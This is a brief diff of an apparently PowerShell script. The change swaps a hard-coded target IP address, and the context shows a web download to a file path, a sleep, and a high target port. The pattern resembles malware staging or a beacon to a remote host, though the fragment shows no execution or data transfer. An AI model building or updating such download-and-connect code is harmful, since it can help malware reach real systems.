@@ -83,7 +83,7 @@ Invoke-WebRequest -Uri $url -OutFile $filePath
 
 Start-Sleep -Seconds 5
 
-$targetIP = "172.84.94.22"
+$targetIP = "16.5.6.92"
 $targetPort = 40129
 
 if (Test-Path $filePath) {
